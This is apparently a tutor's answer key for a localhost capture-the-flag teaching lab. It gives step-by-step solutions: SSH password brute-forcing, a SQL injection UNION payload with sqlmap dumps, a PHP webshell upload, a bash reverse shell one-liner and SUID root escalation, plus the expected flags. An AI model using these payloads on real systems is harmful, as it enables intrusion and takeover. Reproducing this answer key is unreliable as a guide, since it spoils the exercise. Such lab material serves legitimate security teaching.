# ⚠️ TUTOR ONLY — CTF Solutions & Payloads
# DO NOT SHARE WITH STUDENTS BEFORE THE CTF

---

## How flags work
Each student's flag = `FLAG{GITHUB_USERNAME_keyword}`
Example: if GitHub username is `jsmith`, then Challenge 1 flag = `FLAG{jsmith_nmap_b4nner_scan}`

---

## Challenge 1 — NMAP Service Banner (2 pts)

**Vulnerability:** HTTP server leaking custom header with flag.

**Solution — Option A (curl):**
```bash
curl -I http://localhost
# Look for: X-CTF-Flag-1: FLAG{...}
```

**Solution — Option B (nmap):**
```bash
nmap -sV -sC -p 80 localhost
nmap --script=http-headers localhost
```

**Solution — Option C (simple):**
```bash
nmap -A localhost
# Flag visible in HTTP header output
```

---

## Challenge 2 — SSH Weak Credentials (3 pts)

**Vulnerability:** Default weak password `password123` on `student` account.

**Solution — Manual:**
```bash
ssh student@localhost
# Enter password: password123
cat ~/user.txt
```

**Solution — Hydra brute force:**
```bash
hydra -l student -P /usr/share/wordlists/rockyou.txt ssh://localhost
# Finds: student:password123
ssh student@localhost
```

---

## Challenge 3 — Hidden Web Directory (3 pts)

**Vulnerability:** robots.txt lists `/admin-portal/` as disallowed — tells attackers exactly where to look.

**Solution:**
```bash
# Step 1: find robots.txt
curl http://localhost/robots.txt

# Step 2: access disallowed path
curl http://localhost/admin-portal/flag.txt
```

---

## Challenge 4 — SQL Injection (4 pts)

**Vulnerability:** Unsanitised input concatenated directly into SQL query on `/search.php?q=INPUT`.

### Manual UNION injection payload:
```
' UNION SELECT flag,null,null FROM flags-- -
```

**In browser URL:**
```
http://localhost/search.php?q=' UNION SELECT flag,null,null FROM flags-- -
```

**Explanation of payload:**
- `'` — closes the current string in the SQL query
- `UNION SELECT` — appends a second query that returns data from another table
- `flag,null,null` — selects the flag column (null fills the other columns)
- `FROM flags` — the flags table planted during setup
- `-- -` — comments out the rest of the original query

### sqlmap (automated):
```bash
sqlmap -u "http://localhost/search.php?q=admin" \
  --dbs --batch

sqlmap -u "http://localhost/search.php?q=admin" \
  -D hackme -T flags --dump --batch
```

---

## Challenge 5 — File Upload + RCE (4 pts)

**Vulnerability:** `/upload.php` accepts any file type. Uploaded files execute as PHP in `/uploads/`.

**Step 1 — Create the webshell:**
```bash
echo '<?php system($_GET["c"]); ?>' > shell.php
```

**Step 2 — Upload it:**
```bash
curl -F "file=@shell.php" http://localhost/upload.php
```

**Step 3 — Execute command:**
```bash
curl "http://localhost/uploads/shell.php?c=id"
# Output: uid=33(www-data)...

curl "http://localhost/uploads/shell.php?c=cat+/var/www/flag.txt"
# Output: FLAG{...}
```

**Reverse shell (bonus):**
```bash
# Terminal 1 — listener:
nc -lvnp 4444

# Terminal 2 — trigger:
curl "http://localhost/uploads/shell.php?c=bash+-c+'bash+-i+>%26+/dev/tcp/127.0.0.1/4444+0>%261'"
```

---

## Challenge 6 — SUID Privilege Escalation (4 pts)

**Vulnerability:** `/usr/bin/find` has SUID bit set — allows executing commands as root via GTFOBins.

**Step 1 — SSH in as student:**
```bash
ssh student@localhost
# password: password123
```

**Step 2 — Find SUID binaries:**
```bash
find / -perm -4000 -type f 2>/dev/null
# Output includes: /usr/bin/find
```

**Step 3 — Exploit with GTFOBins technique:**
```bash
find . -exec /bin/sh -p \; -quit
# -p flag preserves EUID — gives root shell

# Verify:
whoami   # root
id       # uid=1001(student) gid=1001(student) euid=0(root)
```

**Step 4 — Read root flag:**
```bash
cat /root/root.txt
# FLAG{...}
```

**Why it works:**
The SUID bit on `find` means it runs with root's effective UID. The `-exec` flag runs an arbitrary command inheriting that EUID. The `-p` flag on `/bin/sh` preserves the effective UID, giving a root shell.

---

## Expected Progress Log Format
```
FLAG{jsmith_nmap_b4nner_scan}|2024-11-15 10:23:41|Challenge 1: NMAP Service Banner|2 pts
FLAG{jsmith_ssh_w3ak_cred5}|2024-11-15 10:31:18|Challenge 2: SSH Weak Credentials|3 pts
FLAG{jsmith_r0b0ts_h1dden_d1r}|2024-11-15 10:45:02|Challenge 3: Hidden Web Directory|3 pts
FLAG{jsmith_sql1_inj3ct}|2024-11-15 11:12:33|Challenge 4: SQL Injection|4 pts
FLAG{jsmith_rce_upl04d_shell}|2024-11-15 11:34:57|Challenge 5: File Upload RCE|4 pts
FLAG{jsmith_su1d_r00t_3scalat3}|2024-11-15 12:01:14|Challenge 6: SUID Privilege Escalation|4 pts
```
